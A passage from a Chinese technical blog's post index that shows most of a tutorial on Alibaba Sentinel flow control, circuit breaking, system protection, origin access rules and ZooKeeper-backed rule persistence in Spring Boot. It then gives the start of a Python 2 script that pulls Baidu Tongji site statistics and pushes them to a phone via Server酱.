*/ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { // 被保护的资源 return "Hello Sentinel!"; } /** * 原方法被限流的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { e.printStackTrace(); return "系统繁忙，请稍候 ..."; } /** * 当前类的构造方法执行之后执行此方法 */ @PostConstruct public void initFlowRules() { // 创建存放流控规则的集合 List&lt;FlowRule&gt; rules = new ArrayList&lt;&gt;(); // 创建流控规则 FlowRule rule = new FlowRule(); // 定义资源，表示Sentinel会对哪个资源生效 rule.setResource(RESOURCE_NAME); // 定义流控规则的类型 rule.setGrade(RuleConstant.FLOW_GRADE_QPS); // 定义QPS每秒能通过的请求数 rule.setCount(2); // 将流控规则存放在集合中 rules.add(rule); // 加载流控规则 FlowRuleManager.loadRules(rules); }} 程序运行后，通过浏览器访问 http://127.0.0.1:8080/hello，然后快速多次刷新页面，当每秒的请求数大于 2 时，接口的请求结果为 系统繁忙，请稍候 ...，则说明上面设置的流控规则生效了。 2.3.2、注解属性说明 通过 @SentinelResource 注解的 blockHandler 属性制定具体的限流处理方法 实现处理方法，该方法的传参必须与资源点的传参一样，并且最后必须加上 BlockException 异常参数，同时返回类型也必须一样 2.3.3、Sentinel 控制台动态设置 Sentinel 熔断降级实现3.0、熔断降级概述除了流量控制以外，对调用链路中不稳定的资源进行熔断降级也是保障高可用的重要措施之一。一个服务常常会调用别的模块，可能是另外的一个远程服务、数据库，或者第三方 API 等。例如，支付的时候，可能需要远程调用银联提供的 API；查询某个商品的价格，可能需要进行数据库查询。然而，这个被依赖服务的稳定性是不能保证的。如果依赖的服务出现了不稳定的情况，请求的响应时间变长，那么调用服务的方法的响应时间也会变长，线程会产生堆积，最终可能耗尽业务自身的线程池，服务本身也变得不可用。 现代微服务架构都是分布式的，由非常多的服务组成。不同服务之间相互调用，组成复杂的调用链路。以上的问题在链路调用中会产生放大的效果。复杂链路上的某一环不稳定，就可能会层层级联，最终导致整个链路都不可用。因此需要对不稳定的弱依赖服务调用进行熔断降级，暂时切断不稳定调用，避免局部不稳定因素导致整体的雪崩。熔断降级作为保护自身的手段，通常在客户端（调用端）进行配置。熔断降级会在调用链路中某个资源出现不稳定状态时（例如调用超时或者异常比例升高），对这个资源的调用进行限制，让请求快速多次失败，避免影响到其他的资源而导致级联故障（服务雪崩）。当资源被降级后，在接下来的降级时间窗口之内，对该资源的调用都自动熔断（默认行为是抛出 DegradeException）。 3.1、熔断降级策略 慢调用比例 (SLOW_REQUEST_RATIO）：选择以慢调用比例作为阈值，需要设置允许的慢调用 RT（即最大的响应时间），请求的响应时间大于该值则统计为慢调用。当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且慢调用的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求响应时间小于设置的慢调用 RT 则结束熔断，若大于设置的慢调用 RT 则会再次被熔断。 异常比例 (ERROR_RATIO）：当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且异常的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。 异常数 (ERROR_COUNT）：当单位统计时长内的异常数目超过阈值之后会自动进行熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。 特别注意：异常降级仅针对业务异常，对 Sentinel 限流降级本身的异常（BlockException）不生效。 3.2、熔断降级规则的属性熔断降级规则（DegradeRule）包含下面几个重要的属性： 特别注意：同一个资源可以同时拥有多个熔断降级规则。 3.3、熔断降级规则的设置熔断降级规则设置有以下两种方式： 本地代码设置 在 Sentinel 控制台动态设置 3.3.1、代码设置下面将演示如何使用慢调用比例 (SLOW_REQUEST_RATIO）熔断降级规则，点击下载完整的案例代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768@RestControllerpublic class DegradeController { private static final String RESOURCE_NAME = "Degrade"; private Logger LOG = LoggerFactory.getLogger(DegradeController.class); /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：熔断降级处理的方法 */ @SentinelResource(value = RESOURCE_NAME, fallback = "exceptionHandler") @GetMapping("/hello") public String hello() { // 被保护的资源 try { Random random = new Random(); int millis = random.nextInt(10); LOG.info("sleep time: " + millis); // 随机休眠10毫秒以内，模拟接口慢调用 Thread.sleep(millis); } catch (InterruptedException e) { e.printStackTrace(); } return "hello"; } /** * 原方法被熔断降级的时候调用此方法 * * @return */ public String exceptionHandler() { LOG.error("fallback handler invoke"); return "系统繁忙，请稍候 ..."; } /** * 定义熔断降级规则 */ @PostConstruct public void initDegradeRule() { // 创建存放熔断降级规则的集合 List&lt;DegradeRule&gt; rules = new ArrayList&lt;&gt;(); // 创建熔断降级规则 DegradeRule rule = new DegradeRule(); // 定义资源名称 rule.setResource(RESOURCE_NAME); // 定义熔断降级规则的类型 rule.setGrade(RuleConstant.DEGRADE_GRADE_RT); // 定义降级熔断时间（单位 s） rule.setTimeWindow(5); // 定义慢调用临界RT（超出该值计为慢调用，单位 s） rule.setCount(0.005); // 定义熔断触发的最小请求数 rule.setMinRequestAmount(1); // 定义统计时长（单位为 ms） rule.setStatIntervalMs(1000); // 定义慢调用比例阈值 rule.setSlowRatioThreshold(0.5); // 将熔断降级规则添加到集合中 rules.add(rule); // 加载熔断降级规则 DegradeRuleManager.loadRules(rules); }} 上述定义的慢调用比例熔断降级规则为：调用临界 RT（超出该值计为慢调用）值为 0.005 秒，当 1000 毫秒内请求数量大于 1，且慢调用的比例大于阈值大于 0.5，则熔断降级 5 秒。 程序运行后，通过浏览器访问 http://127.0.0.1:8080/hello，然后快速多次刷新页面，若输出的日志信息类似下面的内容，则说明上面设置的熔断降级规则生效了。 123456789102020-01-18 22:15:45.705 INFO 61206 --- [nio-8080-exec-1] c.s.study.controller.DegradeController : sleep time: 82020-01-18 22:15:46.585 ERROR 61206 --- [nio-8080-exec-3] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:47.112 ERROR 61206 --- [nio-8080-exec-5] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:48.911 ERROR 61206 --- [nio-8080-exec-7] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:49.505 ERROR 61206 --- [nio-8080-exec-9] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:49.809 ERROR 61206 --- [nio-8080-exec-1] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:51.511 INFO 61206 --- [nio-8080-exec-3] c.s.study.controller.DegradeController : sleep time: 12020-01-18 22:15:51.834 INFO 61206 --- [nio-8080-exec-5] c.s.study.controller.DegradeController : sleep time: 32020-01-18 22:15:52.428 ERROR 61206 --- [nio-8080-exec-7] c.s.study.controller.DegradeController : fallback handler invoke2020-01-18 22:15:52.846 ERROR 61206 --- [nio-8080-exec-9] c.s.study.controller.DegradeController : fallback handler invoke 3.3.2、注解属性说明 3.3.3、Sentinel 控制台动态设置 Sentinel 系统自适应保护实现4.0、系统自适应保护概述在开始之前，先了解一下系统保护的目的： 保证系统不被拖垮 在系统稳定的前提下，保持系统的吞吐量 长期以来，系统保护的思路是根据硬指标，即系统的负载 (load1) 来做系统过载保护。当系统负载高于某个阈值，就禁止或者减少流量的进入；当 load 开始好转，则恢复流量的进入。这个思路给我们带来了不可避免的两个问题： load 是一个 “结果”，如果根据 load 的情况来调节流量的通过率，那么就始终有延迟性。也就意味着通过率的任何调整，都会过一段时间才能看到效果。当前通过率是使 load 恶化的一个动作，那么也至少要过 1 秒之后才能观测到；同理，如果当前通过率调整是让 load 好转的一个动作，也需要 1 秒之后才能继续调整，这样就浪费了系统的处理能力。所以我们看到的曲线，总是会有抖动。 恢复慢。想象一下这样的一个场景（真实），出现了这样一个问题，下游应用不可靠，导致应用 RT 很高，从而 load 到了一个很高的点。过了一段时间之后下游应用恢复了，应用 RT 也相应减少。这个时候，其实应该大幅度增大流量的通过率；但是由于这个时候 load 仍然很高，通过率的恢复仍然不高。 TCP BBR 的思想给了我们一个很大的启发。我们应该根据系统能够处理的请求，和允许进来的请求，来做平衡，而不是根据一个间接的指标（系统 load）来做限流。最终我们追求的目标是在系统不被拖垮的情况下，提高系统的吞吐率，而不是 load 一定要到低于某个阈值。如果我们还是按照固有的思维，超过特定的 load 就禁止流量进入，系统 load 恢复就放开流量，这样做的结果是无论我们怎么调参数，调比例，都是按照果来调节因，都无法取得良好的效果。Sentinel 在系统自适应保护的做法是，用 load1 作为启动自适应保护的因子，而允许通过的流量由处理请求的能力，即请求的响应时间以及当前系统正在处理的请求速率来决定。 4.1、系统自适应保护策略系统保护规则是从应用级别的入口流量进行控制，从单台机器的 Load、CPU 使用率、平均 RT、入口 QPS 和并发线程数等几个维度监控应用指标，让系统尽可能跑在最大吞吐量的同时保证系统整体的稳定性。系统保护规则是应用整体维度的，而不是资源维度的，并且仅对入口流量生效。入口流量指的是进入应用的流量（EntryType.IN），比如 Web 服务或 Dubbo 服务端接收的请求，都属于入口流量。 系统规则支持以策略： Load 自适应（仅对 Linux/Unix-like 机器生效）：系统的 load1 作为启发指标，进行自适应系统保护。当系统 load1 超过设定的启发值，且系统当前的并发线程数超过估算的系统容量时才会触发系统保护（BBR 阶段）。系统容量由系统的 maxQps * minRt 估算得出。设定参考值一般是 CPU cores * 2.5。 CPU Usage（1.5.0+ 版本）：当系统 CPU 使用率超过阈值即触发系统保护（取值范围 0.0-1.0），比较灵敏。 平均 RT：当单台机器上所有入口流量的平均 RT 达到阈值即触发系统保护，单位是毫秒。 并发线程数：当单台机器上所有入口流量的并发线程数达到阈值即触发系统保护。 入口 QPS：当单台机器上所有入口流量的 QPS 达到阈值即触发系统保护。 4.2、系统自适应保护规则的属性 特别注意：系统自适应保护规则只针对入口资源（EntryType.IN）有效 4.3、系统自适应保护规则的设置系统自适应保护规则设置有以下两种方式： 本地代码设置 在 Sentinel 控制台动态设置 4.3.1、代码设置以下演示的是如何使用 入口 QPS 系统自适应保护规则，点击下载完整的案例代码。 1234567891011121314151617181920212223242526272829303132@RestControllerpublic class SystemProtectController { /** * 定义资源 * EntryType.IN 表示入口资源 * * @return */ @SentinelResource(entryType = EntryType.IN) @GetMapping("/hello") public String hello() { return "Hello Sentinel!"; } /** * 定义系统自适应保护规则 */ @PostConstruct public void initSystemRule() { // 创建存放系统自适应保护规则的集合 List&lt;SystemRule&gt; rules = new ArrayList&lt;&gt;(); // 创建系统自适应保护规则 SystemRule rule = new SystemRule(); // 定义入口资源的QPS（每秒允许的最大请求数） rule.setQps(2); // 添加系统自适应保护规则到集合中 rules.add(rule); // 加载系统自适应保护规则 SystemRuleManager.loadRules(rules); }} 程序运行后，当 /hello 接口每秒请求的次数大于 2，则会触发 Sentinel 的系统自适应保护规则，同时会返回 Blocked by Sentinel (flow limiting) 字符串给客户端。 4.3.2、Sentinel 控制台动态设置 Sentinel 来源访问控制实现5.0、来源访问控制概述很多时候需要根据调用来源来判断该次请求是否允许放行，这时候可以使用 Sentinel 的来源访问控制（授权控制、黑白名单控制）的功能。来源访问控制根据资源的请求来源（origin）限制资源是否通过，若配置白名单则只有请求来源位于白名单内时才可通过；若配置黑名单则请求来源位于黑名单时不通过，其余的请求通过。调用方的信息通过 ContextUtil.enter(resourceName, origin) 方法中的 origin 参数传入。特别注意，白名单和黑名单不能同时使用。 5.1、来源访问控制规则的属性来源访问控制规则（AuthorityRule）非常简单，主要有以下配置项： resource：资源名，即流控规则的作用对象。 limitApp：对应的黑名单 / 白名单，不同 origin 用 , 分隔，例如 appA,appB。 strategy：限制模式，AUTHORITY_WHITE 为白名单模式，AUTHORITY_BLACK 为黑名单模式，默认为白名单模式。 5.2、来源访问控制规则的设置来源访问控制规则设置有以下两种方式： 本地代码设置 在 Sentinel 控制台动态设置 5.2.1、代码设置下面将演示如何使用白名单来源访问控制规则，点击下载完整的案例代码。 1234567891011/** * 自定义来源解析器 */ @Component public class RequestOriginParserDefinition implements RequestOriginParser { @Override public String parseOrigin(HttpServletRequest httpServletRequest) { return httpServletRequest.getRemoteAddr(); } } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@RestControllerpublic class OriginControlController { private static final String RESOURCE_NAME = "Origin"; /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：被限制访问时处理的方法 */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { return "Hello Sentinel!"; } /** * 原方法被限制访问的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { return "系统繁忙，请稍候 ..."; } /** * 定义来源访问控制规则（黑名单） */ @PostConstruct public void initBlackRule() { // 创建存放规则的集合 List&lt;AuthorityRule&gt; rules = new ArrayList&lt;&gt;(); // 创建来源访问控制规则 AuthorityRule rule = new AuthorityRule(); // 定义资源名称 rule.setResource(RESOURCE_NAME); // 定义限制模式 rule.setStrategy(RuleConstant.AUTHORITY_BLACK); // 定义请求来源 rule.setLimitApp("127.0.0.1"); // 将规则保存到集合中 rules.add(rule); // 加载规则 AuthorityRuleManager.loadRules(rules); }} 程序运行后，通过浏览器访问 http://127.0.0.1:8080/hello，若响应结果为 系统繁忙，请稍候 ...，则说明上面设置的黑名单来源控制规则生效了。 5.2.2、Sentinel 控制台动态设置 Sentinel 动态规则扩展（持久化规则）Sentinel 的理念是开发者只需要关注资源的定义，当资源定义成功后可以动态增加各种流控降级规则。Sentinel 提供以下几种方式设置规则： 通过 API 直接设置 (loadRules) 通过 DataSource 适配不同数据源修改 手动通过 API 设置比较直观，可以通过以下几个 API 设置不同的规则： 1234FlowRuleManager.loadRules(List&lt;FlowRule&gt; rules); // 设置流控规则DegradeRuleManager.loadRules(List&lt;DegradeRule&gt; rules); // 设置熔断降级规则SystemRuleManager.loadRules(List&lt;SystemRule&gt; rules); // 设置系统自适应保护规则AuthorityRuleManager.loadRules(List&lt;AuthorityRule&gt; rules); // 设置来源访问控制规则 6.0、DataSource 扩展不管是通过 Java 代码还是通过 Sentinel 控制台的方式设置流控降级规则，都属于手动方式，不够灵活。这种方式一般仅用于测试和演示，生产环境一般通过动态规则源的方式来动态管理流控降级规则。上述 loadRules() 方法只接受内存态的规则对象，但更多时候规则存储在文件、数据库或者配置中心当中。Sentinel 的 DataSource 接口提供了对接任意数据源的能力。Sentinel 官方推荐通过控制台设置规则后，将规则推送到统一的规则中心，客户端则实现 ReadableDataSource 接口监听规则中心来实时获取规则配置的变更，流程图如下： DataSource 扩展常见的实现方式有: 拉模式：客户端主动向某个规则管理中心定期轮询拉取规则，这个规则中心可以是 RDBMS、文件，甚至是 VCS 等。这样做的方式是简单，缺点是无法及时获取变更 推模式：规则中心统一推送，客户端通过注册监听器的方式时刻监听变化，比如使用 Nacos、Zookeeper 等配置中心，这种方式有更好的实时性和一致性保证 Sentinel 目前支持以下数据源扩展： Pull-based（拉模式）: 动态文件数据源、Consul、Eureka Push-based（推模式）: ZooKeeper、Apollo、Nacos, etcd、Redis 6.1、使用 ZooKeeper 规则配置（推模式）下面将演示如何使用 ZooKeeper 存放 Sentinel 的流控规则配置数据，使用的是 推模式，各组件的版本如下，点击下载完整的案例代码。 Sentinel 1.8.0 ZooKeeper Server 3.5.5 Spring Boot 2.1.18.RELEASE Sentinel Datasource Zookeeper 1.8.0 Spring Cloud Starter Sentinel 2.1.3.RELEASE 6.1.1、代码示例引入 Maven 依赖，添加 sentinel-datasource-zookeeper 依赖 1234567891011121314151617181920212223242526272829303132333435&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt; &lt;sentinel-datasource-zookeeper.version&gt;1.8.0&lt;/sentinel-datasource-zookeeper.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-datasource-zookeeper&lt;/artifactId&gt; &lt;version&gt;${sentinel-datasource-zookeeper.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Sentinel 的 配置类，让 Sentinel 使用 ZooKeeper 作为规则配置数据源 12345678910111213141516171819202122232425@Configurationpublic class SentinelZookeeperConfig { public static final String ZOOKEEPER_ADDRESS = "127.0.0.1:2181"; public static final String ZOOKEEPER_PATH = "/Sentinel/FlowRules"; /** * Sentinel从Zookeeper加载规则配置数据 */ @PostConstruct public void init() { // 参数一：Zookeeper的地址 // 参数二：Zookeeper中数据的路径 // 参数三：Zookeeper中数据的解析器 ReadableDataSource&lt;String, List&lt;FlowRule&gt;&gt; flowRuleDataSource = new ZookeeperDataSource&lt;&gt;( ZOOKEEPER_ADDRESS, ZOOKEEPER_PATH, source -&gt; JSON.parseObject(source, new TypeReference&lt;List&lt;FlowRule&gt;&gt;() { })); // 加载流控规则 FlowRuleManager.register2Property(flowRuleDataSource.getProperty()); }} 创建 Controller 测试类 123456789101112131415161718192021222324252627282930313233@RestControllerpublic class HelloController { private final static Logger LOG = LoggerFactory.getLogger(HelloController.class); /** * 资源名称 */ public static final String RESOURCE_NAME = "Hello"; /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：限流处理的方法 */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { return "Hello Sentinel!"; } /** * 原方法被限流的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { LOG.info("系统繁忙，请稍候 ..."); return "系统繁忙，请稍候 ..."; }} 创建主启动类 1234567@SpringBootApplicationpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 创建 application.yml 配置文件，其中 sentinel.transport.dashboard 为非必要配置项；若不需要通过 Sentinel 控制台监控应用，这里可以不配置 sentinel.transport.dashboard，无论是否配置都不会影响应用加载和动态感知 ZooKeeper Server 中的规则配置数据 12345678910server: port: 8080spring: application: name: sentinel-zookeeper-demo cloud: sentinel: transport: dashboard: 127.0.0.1:9000 # 非必要配置项 创建 ZooKeeper 的数据测试类，作用是插入规则配置数据到 ZooKeeper 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556@RunWith(SpringRunner.class)@SpringBootTestpublic class ZookeeperConfigSender { private static final int RETRY_TIMES = 3; private static final int SLEEP_TIME = 1000; @Test public void sendData() throws Exception { final String remoteAddress = "127.0.0.1:2181"; final String groupId = "Sentinel"; final String dataId = "FlowRules"; final String rule = "[\\n" + " {\\n" + " \\"resource\\": \\"Hello\\",\\n" + " \\"controlBehavior\\": 0,\\n" + " \\"count\\": 2.0,\\n" + " \\"grade\\": 1,\\n" + " \\"limitApp\\": \\"default\\",\\n" + " \\"strategy\\": 0\\n" + " }\\n" + "]"; CuratorFramework zkClient = CuratorFrameworkFactory.newClient(remoteAddress, new ExponentialBackoffRetry(SLEEP_TIME, RETRY_TIMES)); zkClient.start(); String path = getPath(groupId, dataId); Stat stat = zkClient.checkExists().forPath(path); if (stat == null) { zkClient.create().creatingParentContainersIfNeeded().withMode(CreateMode.PERSISTENT).forPath(path, null); } zkClient.setData().forPath(path, rule.getBytes()); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } zkClient.close(); } private static String getPath(String groupId, String dataId) { String path = ""; if (groupId.startsWith("/")) { path += groupId; } else { path += "/" + groupId; } if (dataId.startsWith("/")) { path += dataId; } else { path += "/" + dataId; } return path; }} 6.1.2、测试代码 1）启动 ZooKeeper Server 2）启动 sentinel-zookeeper-demo 应用，若控制台输出如下日志信息，则说明应用已经成功连接上 ZooKeeper 服务器 1234[localhost:2181)] org.apache.zookeeper.ClientCnxn : Opening socket connection to server localhost/127.0.0.1:2181. Will not attempt to authenticate using SASL (unknown error)[localhost:2181)] org.apache.zookeeper.ClientCnxn : Socket connection established to localhost/127.0.0.1:2181, initiating session[localhost:2181)] org.apache.zookeeper.ClientCnxn : Session establishment complete on server localhost/127.0.0.1:2181, sessionid = 0x10000447be50007, negotiated timeout = 40000[ain-EventThread] o.a.c.f.state.ConnectionStateManager : State change: CONNECTED 3）浏览器访问 http://127.0.0.1:8080/hello，快速多次刷新页面，可以发现响应结果会一直返回 Hello Sentinel! 字符串 4）通过 Junit 执行 ZookeeperConfigSender.sendData() 方法，将规则配置数据插入到 ZooKeeper Server 5）通过命令行登录进 ZooKeeper Server 后，执行以下操作，可以观察到 ZooKeeper Server 中有对应的规则配置数据成功插入了 1234567891011[zk: localhost:2181(CONNECTED) 15] get /Sentinel/FlowRules[ { "resource": "Hello", "controlBehavior": 0, "count": 2.0, "grade": 1, "limitApp": "default", "strategy": 0 }] 6）浏览器再次快速多次访问 http://127.0.0.1:8080/hello，若响应结果为 系统繁忙，请稍候 ...，则说明 Sentinel 成功加载到 ZooKeeper Server 里的规则配置数据，而且是基于 推模式，默认支持监听规则配置的变更 6.2、更多数据源扩展支持Sentinel 默认还支持文件、Nacos、Apollo、Redis 等作为数据源扩展，这里不再累述，具体可以阅读官方文档中的动态规则扩展。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"百度统计 API（Python 版）",url:"/posts/94326301.html",text:"前言 百度统计 API 文档 百度统计 Token 获取 百度统计 API 调试工具 以下代码参考了官方 PHP 版的 Demo，兼容 Python2，不兼容 Python3 创建 RSA 公钥新建 RSA 公钥文件 api_pub.key，然后将以下内容拷贝并保存到该文件中。 123456-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHn/hfvTLRXViBXTmBhNYEIJeGGGDkmrYBxCRelriLEYEcrwWrzp0au9nEISpjMlXeEW4+T82bCM22+JUXZpIga5qdBrPkjU08Ktf5n7Nsd7n9ZeI0YoAKCub3ulVExcxGeS3RVxFai9ozERlavpoTOdUzEH6YWHP4reFfpMpLzwIDAQAB-----END PUBLIC KEY----- Python2 代码以下 Python 代码调用了百度统计的 API 接口，默认会获取今天和昨天的网站概况统计数据，然后通过 Server 酱 将 MarkDown 格式（HTML 表格）的统计数据发送到特定的手机（需绑定 Server 酱的微信公众号）。Linux 系统环境下，配合 Python 脚本 + Crontab 定时任务，即可定时发送统计报表信息到特定的手机上，这样就不再需要频繁登录 Web 版的百度统计管理后台了。请自行替换代码中的 PUBLIC_KEY_FILE、USER_NAME、PASS_WORD、TOKEN、SC_URL 变量值，点击此处可查看移动端的展示效果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345# --*-- coding:utf-8 ---*---import sysimport jsonimport requestsimport mathimport StringIOimport gzipimport rsaimport uuidimport timeimport loggingimport datetimereload(sys)sys.setdefaultencoding('utf8')UUID = str(uuid.uuid1())PUBLIC_KEY_FILE = './api_pub.key'LOG_FILE = \"/tmp/baidu_tongji_report.log\"ACCOUNT_TYPE = '1' # 百度统计的账号类型：ZhanZhang:1, FengChao:2, Union:3, Columbus:4USER_NAME = 'xxxxxxxxx' # 百度统计的用户名PASS_WORD = 'xxxxxxxxxxxxxxxxxx' # 百度统计的密码TOKEN = 'xxxxxxxxxxxxxxxxxxxxxxxxxxx' # 百度统计的TokenAPI_URL = 'https://api.baidu.com/json/tongji/v1/ReportService' # 百度统计的查询接口LOGIN_URL = 'https://api.baidu.com/sem/common/HolmesLoginService' # 百度统计的登录接口SC_URL = 'https://sc.ftqq.com/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.send' # Server酱的消息接口def encrypt(data): # 加载公钥 with open(PUBLIC_KEY_FILE) as publickfile: p = publickfile.read() pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(p) # 用公钥加密 n = int(math.ceil(len(data) * 1.0 / 117)) ret = '' for i in range(n): gzdata = data[i * 117:(i + 1) * 117] ret += rsa.encrypt(gzdata, pubkey) return ret# 解压gzipdef gzdecode(data): f = StringIO.StringIO(data) gziper = gzip.GzipFile(fileobj=f, compresslevel=9) data2 = gziper.read() gziper.close() return data2# 压缩gzipdef gzencode(data): f = StringIO.StringIO() gziper = gzip.GzipFile(fileobj=f, mode='wb', compresslevel=9, ) gziper.write(data) gziper.close() return f.getvalue()# 日期解析器class DateEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj, datetime.date): return obj.strftime('%Y-%m-%d') else: return json.JSONEncoder.default(self, obj)# 发送消息def sendMessage(title, content): data = {'text': title, 'desp': content} response = requests.get(SC_URL, params=data) return response.contentclass BaiduTongji(object): ucid = None st = None def __init__(self, username, password, token): self.username = username self.password = password self.token = token # login # self.prelogin() ret = self.dologin() self.ucid = str(ret['ucid']) self.st = ret['st'] def prelogin(self): data = {'username': self.username, 'token': self.token, 'functionName': 'preLogin', 'uuid': UUID, 'request': {'osVersion': 'windows', 'deviceType': 'pc', 'clientVersion': '1.0'}, } headers = {'UUID': UUID, 'account_type': ACCOUNT_TYPE, 'Content-Type': 'data/gzencode and rsa public encrypt;charset=UTF-8' } # 压缩 post_data = gzencode(json.dumps(data)) # 加密 post_data = encrypt(post_data) resp = requests.post(LOGIN_URL, data=post_data, headers=headers) ret = json.loads(gzdecode(resp.content[8:])) print 'prelogin:', ret def dologin(self): data = {'username': self.username, 'token': self.token, 'functionName': 'doLogin', 'uuid': UUID, 'request': {'password': self.password} } headers = {'UUID': UUID, 'account_type': ACCOUNT_TYPE, 'Content-Type': 'data/gzencode and rsa public encrypt;charset=UTF-8' } # 压缩 post_data = gzencode(json.dumps(data)) # 加密 post_data = encrypt(post_data) # post resp = requests.post(LOGIN_URL, data=post_data, headers=headers) ret = json.loads(gzdecode(resp.content[8:])) if ret['retcode'] == 0: print u'dologin:', ret['retmsg'], ' ucid:', ret['ucid'], ' st:', ret['st'] return ret def dologout(self): data = {'username': self.username, 'token': self.token, 'functionName': 'doLogout', 'uuid': UUID, 'request': {'ucid': self.ucid, 'st': self.st, } } headers = {'UUID': UUID, 'account_type': ACCOUNT_TYPE, 'Content-Type': 'data/gzencode and rsa public encrypt;charset=UTF-8' } # 压缩 post_data = gzencode(json.dumps(data)) # 加密 post_data = encrypt(post_data) # post resp = requests.post(LOGIN_URL, data=post_data, headers=headers) ret = json.loads(gzdecode(resp.content[8:])) print 'logout:', ret['retmsg'] def getsitelist(self): url = API_URL + '/getSiteList' headers = {'UUID': UUID, 'USERID': self.ucid, 'Content-Type': 'data/json;charset=UTF-8'} data = {'header': {'username': self.username, 'password': self.st, 'token': self.token, 'account_type': ACCOUNT_TYPE, }, 'body': None, } post_data = json.dumps(data) resp = requests.post(url, data=post_data, headers=headers) # print resp.json() return resp.json()['body']['data'][0]['list'] def getdata(self, para): url = API_URL + '/getData' headers = {'UUID': UUID, 'USERID': self.ucid, 'Content-Type': 'data/json;charset=UTF-8'} data = {'header': {'username': self.username, 'password': self.st, 'token': self.token, 'account_type': ACCOUNT_TYPE, }, 'body': para, } post_data = json.dumps(data, cls=DateEncoder) resp = requests.post(url, data=post_data, headers=headers) # print resp.json() return resp.json()['body']''' # 地域分布报告 visit/district/a # pv_count (浏览量(PV)) # pv_ratio (浏览量占比，%) # visit_count (访问次数) # visitor_count (访客数(UV)) # new_visitor_count (新访客数) # new_visitor_ratio (新访客比率，%) # ip_count (IP 数) # bounce_ratio (跳出率，%) # avg_visit_time (平均访问时长，秒) # avg_visit_pages (平均访问页数) # trans_count (转化次数) # trans_ratio (转化率，%) # 